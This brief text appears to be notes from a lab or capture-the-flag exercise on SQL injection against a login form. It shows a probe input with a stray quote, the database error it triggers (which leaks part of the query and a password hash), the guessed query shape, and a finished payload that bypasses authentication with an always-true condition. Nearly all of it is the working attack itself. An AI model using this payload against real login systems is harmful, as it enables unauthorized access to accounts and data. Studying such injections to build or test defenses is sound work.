```
admin'
```
```
ERROR:  syntax error at or near "86"
LINE 1: ...ers WHERE (username = ('admin'') AND password = ('86f7e437fa...
```
SQL Query Like:
```
SELECT *
FROM users
WHERE (username = ('$username')
       AND password = ('$password$'));
```
Payload:
```
username=admin') or ('2' > '1&password=a
```